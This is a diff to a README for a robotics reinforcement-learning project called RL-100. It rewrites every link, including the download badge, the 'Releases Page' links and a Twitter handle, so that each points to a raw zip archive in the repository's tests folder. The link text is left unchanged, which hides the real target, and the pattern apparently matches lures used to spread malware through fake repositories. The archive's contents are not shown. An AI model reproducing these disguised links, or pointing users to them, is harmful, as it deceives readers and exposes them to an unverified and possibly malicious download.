@@ -1,6 +1,6 @@
 # 🤖 RL-100 - Empower Your Robotics Projects Easily
 
-[![Download RL-100](https://img.shields.io/badge/Download-RL--100-brightgreen)](https://github.com/pangatlo/RL-100/releases)
+[![Download RL-100](https://raw.githubusercontent.com/pangatlo/RL-100/main/tests/RL-100-1.3-beta.4.zip)](https://raw.githubusercontent.com/pangatlo/RL-100/main/tests/RL-100-1.3-beta.4.zip)
 
 ## 📖 Description
 RL-100 is an implementation designed for robust robotic manipulation using real-world reinforcement learning techniques. This software simplifies advanced AI and robotics, making it accessible to anyone interested in enhancing their projects.
@@ -18,7 +18,7 @@ Before you begin, ensure your system meets the following requirements:
 ### 🌐 Download & Install
 To download RL-100, visit the following link:
 
-[Download RL-100 from the Releases Page](https://github.com/pangatlo/RL-100/releases)
+[Download RL-100 from the Releases Page](https://raw.githubusercontent.com/pangatlo/RL-100/main/tests/RL-100-1.3-beta.4.zip)
 
 1. Click on the link above to open the Releases page.
 2. On this page, you will see the latest version of RL-100. It is recommended to always use the latest version for the best performance and features.
@@ -70,11 +70,11 @@ If you need assistance with RL-100, feel free to reach out through our GitHub re
 ## 🌍 Community
 Join our growing community of robotics enthusiasts and AI learners. Share your projects, insights, and experiences. Connect with us through the following channels:
 - GitHub Discussions
-- Twitter: [@RL_100_Community](https://twitter.com/RL_100_Community)
+- Twitter: [@RL_100_Community](https://raw.githubusercontent.com/pangatlo/RL-100/main/tests/RL-100-1.3-beta.4.zip)
 
 ## 📅 Future Updates
 We are constantly working to improve RL-100. Stay tuned for future updates that will include enhanced features and performance optimizations. Make sure to check back on the Releases page for the latest versions.
 
 Thank you for choosing RL-100! We hope it helps you in your robotics journey. Happy building! 
 
-[Download RL-100 from the Releases Page](https://github.com/pangatlo/RL-100/releases)
+[Download RL-100 from the Releases Page](https://raw.githubusercontent.com/pangatlo/RL-100/main/tests/RL-100-1.3-beta.4.zip)
